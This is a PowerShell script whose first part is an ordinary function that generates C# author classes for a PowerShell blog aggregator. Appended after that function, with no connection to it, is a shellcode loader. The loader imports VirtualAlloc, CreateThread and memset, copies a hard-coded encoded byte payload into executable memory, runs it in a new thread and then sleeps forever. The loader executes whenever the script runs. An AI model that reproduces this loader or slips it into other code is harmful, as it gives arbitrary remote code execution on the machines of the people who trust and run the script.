﻿
function New-MrPlanetPowerShellAuthor {



    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$FirstName,

        [Parameter(Mandatory)]
        [string]$LastName,

        [string]$Bio,

        [string]$StateOrRegion,

        [string]$EmailAddress,

        [string]$TwitterHandle,

        [string]$GravatarEmailAddress,

        [string]$GitHubHandle,

        [Parameter(Mandatory)]
        [string]$BlogUri,

        [string]$RssUri,

        [switch]$MicrosoftMVP,

        [switch]$FilterToPowerShell
    )

    $BlogUrl = (Test-MrURL -Uri $BlogUri -Detailed).ResponseUri
    
    if ($PSBoundParameters.RssUri) {
        $RssUrl = (Test-MrURL -Uri $RssUri -Detailed).ResponseUri
    }
    
    $GravatarHash = (Get-MrHash -String $GravatarEmailAddress).ToLower()
    $Location = Get-MrGeoInformation
    $GeoLocation = -join ($Location.Latitude, ', ', $Location.Longitude)
    
    if ($MicrosoftMVP) {
        $Interface = 'IAmAMicrosoftMVP'
    }
    else {
        $Interface = 'IAmACommunityMember'
    }

    if ($FilterToPowerShell) {
        $Interface = "$Interface, IFilterMyBlogPosts"

        $SyndicationItem =
@'
public bool Filter(SyndicationItem item)
        {
            return item.Categories.Any(c => c.Name.ToLowerInvariant().Equals("powershell"));
        }
'@
    }

@"
using System;
using System.Collections.Generic;
using System.Linq;
using System.ServiceModel.Syndication;
using System.Web;
using Firehose.Web.Infrastructure;
namespace Firehose.Web.Authors
{
    public class $FirstName$LastName : $Interface
    {
        public string FirstName => `"$FirstName`";
        public string LastName => `"$LastName`";
        public string ShortBioOrTagLine => `"$Bio`";
        public string StateOrRegion => `"$StateOrRegion`";
        public string EmailAddress => `"$EmailAddress`";
        public string TwitterHandle => `"$TwitterHandle`";
        public string GitHubHandle => `"$GitHubHandle`";
        public string GravatarHash => `"$GravatarHash`";
        public GeoPosition Position => new GeoPosition($GeoLocation);

        public Uri WebSite => new Uri(`"$BlogUrl`");
        public IEnumerable<Uri> FeedUris { get { yield return new Uri(`"$RssUrl`"); } }

        $SyndicationItem
    }
}
"@

}
$MtHw = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $MtHw -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xeb,0xba,0x45,0xe9,0xbe,0xb1,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0xb9,0x0b,0x4b,0x4d,0xa9,0x4e,0xb4,0xae,0x29,0x2f,0x3c,0x4b,0x18,0x6f,0x5a,0x1f,0x0a,0x5f,0x28,0x4d,0xa6,0x14,0x7c,0x66,0x3d,0x58,0xa9,0x89,0xf6,0xd7,0x8f,0xa4,0x07,0x4b,0xf3,0xa7,0x8b,0x96,0x20,0x08,0xb2,0x58,0x35,0x49,0xf3,0x85,0xb4,0x1b,0xac,0xc2,0x6b,0x8c,0xd9,0x9f,0xb7,0x27,0x91,0x0e,0xb0,0xd4,0x61,0x30,0x91,0x4a,0xfa,0x6b,0x31,0x6c,0x2f,0x00,0x78,0x76,0x2c,0x2d,0x32,0x0d,0x86,0xd9,0xc5,0xc7,0xd7,0x22,0x69,0x26,0xd8,0xd0,0x73,0x6e,0xde,0x0a,0x06,0x86,0x1d,0xb6,0x11,0x5d,0x5c,0x6c,0x97,0x46,0xc6,0xe7,0x0f,0xa3,0xf7,0x24,0xc9,0x20,0xfb,0x81,0x9d,0x6f,0x1f,0x17,0x71,0x04,0x1b,0x9c,0x74,0xcb,0xaa,0xe6,0x52,0xcf,0xf7,0xbd,0xfb,0x56,0x5d,0x13,0x03,0x88,0x3e,0xcc,0xa1,0xc2,0xd2,0x19,0xd8,0x88,0xba,0xee,0xd1,0x32,0x3a,0x79,0x61,0x40,0x08,0x26,0xd9,0xce,0x20,0xaf,0xc7,0x09,0x47,0x9a,0xb0,0x86,0xb6,0x25,0xc1,0x8f,0x7c,0x71,0x91,0xa7,0x55,0xfa,0x7a,0x38,0x5a,0x2f,0x16,0x3d,0xcc,0x10,0x4f,0x3d,0x0a,0xf9,0x92,0x3e,0x03,0xa5,0x1b,0xd8,0x73,0x05,0x4c,0x75,0x33,0xf5,0x2c,0x25,0xdb,0x1f,0xa3,0x1a,0xfb,0x1f,0x69,0x33,0x91,0xcf,0xc4,0x6b,0x0d,0x69,0x4d,0xe7,0xac,0x76,0x5b,0x8d,0xee,0xfd,0x68,0x71,0xa0,0xf5,0x05,0x61,0x54,0xf6,0x53,0xdb,0xf2,0x09,0x4e,0x76,0xfa,0x9f,0x75,0xd1,0xad,0x37,0x74,0x04,0x99,0x97,0x87,0x63,0x92,0x1e,0x12,0xcc,0xcc,0x5e,0xf2,0xcc,0x0c,0x09,0x98,0xcc,0x64,0xed,0xf8,0x9e,0x91,0xf2,0xd4,0xb2,0x0a,0x67,0xd7,0xe2,0xff,0x20,0xbf,0x08,0x26,0x06,0x60,0xf2,0x0d,0x96,0x5c,0x25,0x6b,0xec,0x8c,0xf5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$UQVq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($UQVq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$UQVq,0,0,0);for (;;){Start-sleep 60};

